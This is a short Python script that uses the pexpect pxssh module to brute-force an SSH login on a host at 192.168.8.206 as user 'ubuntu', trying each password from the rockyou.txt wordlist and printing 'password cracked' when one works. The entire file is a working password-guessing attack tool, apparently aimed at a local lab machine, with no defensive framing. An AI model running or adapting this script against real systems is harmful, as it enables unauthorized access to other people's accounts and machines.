from pexpect import pxssh
import getpass

with open("rockyou.txt") as fobj:
    for line in fobj:
        line = line.replace("\n","")
        password = line
        
        try:
            s = pxssh.pxssh()
            hostname = "192.168.8.206"
            username = "ubuntu"
            s.login(hostname, username, password)
        
            #s.logout()
            print(f"password cracked {password}")
            exit()
        except pxssh.ExceptionPxssh as e:
            print("pxssh failed on login.")
            print(e)
    
